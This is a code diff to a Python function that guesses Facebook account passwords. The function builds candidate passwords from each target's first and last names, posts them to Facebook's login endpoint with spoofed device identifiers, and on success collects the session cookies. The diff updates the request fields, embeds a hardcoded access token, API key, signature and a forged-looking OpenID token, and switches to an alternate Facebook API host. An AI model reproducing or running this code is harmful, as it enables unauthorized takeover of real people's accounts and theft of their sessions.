@@ -1099,36 +1099,28 @@ def bapi(uid, name, pwx, tl):
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
             secure = str(uuid.uuid4())
-            data = {
-            'email': uid,
-            'password': pw,
-            'adid': str(uuid.uuid4()),
+            data = {'adid': str(uuid.uuid4()),
+            'format': 'json',
             'device_id': str(uuid.uuid4()),
             'family_device_id': str(uuid.uuid4()),
-            'session_id': str(uuid.uuid4()),
-            'advertiser_id': str(uuid.uuid4()),
-            'reg_instance': str(uuid.uuid4()),
-            'logged_out_id': str(uuid.uuid4()),
-            'locale': 'en_US',
-            'client_country_code': 'US',
+            'secure_family_device_id': str(uuid.uuid4()),
             'cpl': 'true',
-            'source': 'login',
-            'format': 'json',
-            'omit_response_on_success': 'false',
-            'credentials_type': 'password',
-            'error_detail_type': 'button_with_disabled',
+            'try_num': '1',
+            'email': uid,
+            'password':f'#PWD_FB4A:0:{int(time.time())}:{pw}',
+            'method': 'auth.login',
             'generate_session_cookies': '1',
-            'generate_analytics_claim': '1',
-            'generate_machine_id': '1',
-            'tier': 'regular',
-            'currently_logged_in_userid': '0',
+            'sim_serials': "['80973453345210784798']",
+            'openid_flow': 'android_login',
+            'openid_provider': 'google',
+            'openid_emails': "['01710940017']",
+            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+            'error_detail_type': 'button_with_disabled',
+            'source': 'account_recovery',
+            'locale': 'fr_DZ',
+            'client_country_code': 'DZ',
             'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
-            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'api_key': '882a8490361da98702bf97a021ddc14d',
-            'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
+            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers = {
             'Host': 'graph.facebook.com',
             'User-Agent': UA(),
@@ -1146,7 +1138,7 @@ def bapi(uid, name, pwx, tl):
             'X-FB-Friendly-Name': 'authenticate',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
-            url = "https://graph.facebook.com/auth/login"
+            url = "https://b-graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
